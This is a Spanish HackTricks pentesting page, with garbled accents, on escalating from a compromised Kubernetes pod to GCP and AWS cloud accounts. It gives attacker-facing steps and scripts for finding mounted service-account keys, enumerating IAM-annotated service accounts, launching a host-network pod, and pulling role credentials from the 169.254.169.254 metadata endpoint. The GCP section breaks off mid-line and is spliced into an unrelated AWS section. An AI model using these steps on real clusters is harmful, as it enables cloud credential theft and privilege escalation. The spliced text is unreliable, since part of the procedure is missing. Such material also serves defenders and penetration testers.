# Kubernetes Pivoting to Clouds

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## GCP

Si est√°s ejecutando un cl√∫ster k8s dentro de GCP, probablemente querr√°s que alguna aplicaci√≥n que se ejecute dentro del cl√∫ster tenga acceso a GCP. Hay 2 formas comunes de hacerlo:

### Montar claves GCP-SA como secreto

Una forma com√∫n de dar **acceso a una aplicaci√≥n de Kubernetes a GCP** es:

* Crear una cuenta de servicio de GCP
* Vincular en ella los permisos deseados
* Descargar una clave json de la SA creada
* Montarla como un secreto dentro del pod
* Establecer la variable de entorno GOOGLE\_APPLICATION\_CREDENTIALS apuntando a la ruta donde se encuentra el json.

{% hint style="warning" %}
Por lo tanto, como **atacante**, si comprometes un contenedor dentro de un pod, debes buscar esa **variable de entorno** y **archivos json** con credenciales de GCP.
{% endhint %}

### Relacionar json de GSA con secreto de KSA

Una forma de dar acceso a un GSA a un cl√∫ster GKE es vincul√°ndolos de esta manera:

* Crear una cuenta de servicio de Kubernetes en el mismo espacio de nombres que tu cl√∫ster GKE usando el siguiente comando:

```bash
Copy codekubectl create serviceaccount <service-account-name>
```

* Crear un secreto de Kubernetes que contenga las credenciales de la cuenta de servicio de GCP a la que desea otorgar acceso al cl√∫ster GKE. Puede hacer esto usando la herramienta de l√≠nea de comandos `gcloud`, como se muestra en el siguiente ejemplo:

```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
    --iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
    --from-file=key.json=<key-file-name>.json
```

* Vincular el secreto de Kubernetes a la cuenta de servicio de Kubernetes utilizando el siguiente comando:

```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
    iam.gke.io/gcp-service-account=<gcp-service-account-email>
```

{% hint style="warning" %}
En el **segundo paso** se establecieron las **credenciales de la GSA como secreto de la KSA**. Entonces, si puedes **leer ese secreto** desde **dentro** del **cl√∫ster GKE**, puedes **escalar a esa cuenta de servicio de GCP**.
{% endhint %}

### Identidad de carga de trabajo de GKE

Con Workload Identity, podemos configurar una [cuenta de servicio de Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) para actuar como una [cuenta de servicio de Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Los pods que se ejecutan con la cuenta de servicio de Kubernetes se autenticar√°n autom√°ticamente como la cuenta de servicio de Google al acceder a las API de Google Cloud.

La **primera serie de pasos** para habilitar este comportamiento es **habilitar Workload Identity en GCP** ([**pasos**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) y crear la cuenta de servicio de GCP que desea que k8s suplante.

* **Habilitar Workload Identity** en un nuevo cl√∫ster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
    --region=us-central1 \
    --workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Crear/Actualizar un nuevo nodepool** (los cl√∫steres de Autopilot no necesitan esto)

{% code overflow="wrap" %}
```bash
# Puedes actualizar en lugar de crear
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Crear la **cuenta de servicio de GCP para suplantar** desde K8s con permisos de GCP:

{% code overflow="wrap" %}
```bash
# Crear SA llamada "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Dar el rol "roles/iam.securityReviewer" a la SA
gcloud projects add-iam-policy-binding <project-id> \
    --member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
    --role "roles/iam.securityReviewer"
```
{% endcode %}

* **Conectar** al **cl√∫ster** y **crear** la **cuenta de servicio** a usar

{% code overflow="wrap" %}
```bash
# Obtener credenciales de k8s
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generar nuestro espacio de nombres de prueba
kubectl create namespace testing

# Crear la KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Vincular la GSA con la KSA**

{% code overflow="wrap" %}
```bash
# Permitir que la KSA acceda a la GSA en GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
    --role roles/iam.workloadIdentityUser \
    --member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicar a K
#### Crear Pod con Rol IAM

{% hint style="info" %}
El rol IAM a indicar debe estar en la misma cuenta de AWS que el rol kiam/kube2iam y ese rol debe poder acceder a √©l.
{% endhint %}

```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
  annotations:
    iam.amazonaws.com/role: transaction-metadata
  name: alpine
  namespace: eevee
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]' | kubectl apply -f -
```

### Rol IAM para cuentas de servicio de K8s a trav√©s de OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Esta es la **forma recomendada por AWS**.

1. En primer lugar, debe [crear un proveedor OIDC para el cl√∫ster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Luego crea un rol IAM con los permisos que requerir√° el SA.
3. Cree una [relaci√≥n de confianza entre el rol IAM y el SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nombre (o los espacios de nombres que dan acceso al rol a todos los SA del espacio de nombres). _La relaci√≥n de confianza verificar√° principalmente el nombre del proveedor OIDC, el nombre del espacio de nombres y el nombre del SA_.
4. Finalmente, **crea un SA con una anotaci√≥n que indique el ARN del rol**, y los pods que se ejecuten con ese SA tendr√°n **acceso al token del rol**. El **token** se **escribe** dentro de un archivo y la ruta se especifica en **`AWS_WEB_IDENTITY_TOKEN_FILE`** (predeterminado: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)

```bash
# Crear una cuenta de servicio con un rol
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-service-account
  namespace: default
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Agregar un rol a una cuenta de servicio existente
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```

Para **obtener aws usando el token** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` ejecute:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Como atacante, si puede enumerar un cl√∫ster K8s, verifique las **cuentas de servicio con esa anotaci√≥n** para **escalar a AWS**. Para hacerlo, simplemente **ejecute/crea** un **pod** utilizando una de las cuentas de servicio IAM **privilegiadas** y robe el token.

Adem√°s, si est√° dentro de un pod, verifique las variables de entorno como **AWS\_ROLE\_ARN** y **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
A veces, la **Pol√≠tica de confianza de un rol** puede estar **mal configurada** y, en lugar de dar acceso a AssumeRole a la cuenta de servicio esperada, lo da a **todas las cuentas de servicio**. Por lo tanto, si es capaz de escribir una anotaci√≥n en una cuenta de servicio controlada, puede acceder al rol.

Consulte la **siguiente p√°gina para obtener m√°s informaci√≥n**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Encontrar Pods y SAs con Roles IAM en el cl√∫ster

Este es un script para **iterar f√°cilmente sobre todos los pods y definiciones de sas** buscando esa **anotaci√≥n**:

```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
    for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "Pod: $ns/$pod"
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
    for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
        echo "SA: $ns/$sa"
        kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
        echo ""
        echo ""
    done
done | grep -B 1 "amazonaws.com"
```

### Rol IAM del nodo

La secci√≥n anterior trataba sobre c√≥mo robar roles IAM con pods, pero tenga en cuenta que un **Nodo del** cl√∫ster K8s va a ser una **instancia dentro de la nube**. Esto significa que es muy probable que el Nodo vaya a tener un nuevo rol IAM que pueda robar (_tenga en cuenta que por lo general todos los nodos de un cl√∫ster K8s tendr√°n el mismo rol IAM, por lo que puede que no valga la pena intentar verificar en cada nodo_).

Sin embargo, hay un requisito importante para acceder al punto final de metadatos desde el nodo, debe estar en el nodo (¬øsesi√≥n ssh?) o al menos tener la misma red:

```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```

### Robar token de rol IAM

Anteriormente hemos discutido c√≥mo **adjuntar roles IAM a Pods** o incluso c√≥mo **escapar al Nodo para robar el Rol IAM** que la instancia tiene adjunto.

Puede usar el siguiente script para **robar** sus nuevas **credenciales de rol IAM**:

```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
    echo "IAM Role discovered: $IAM_ROLE_NAME"
    if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
        echo "Credentials:"
        curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
    fi
fi
```

## Referencias

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opense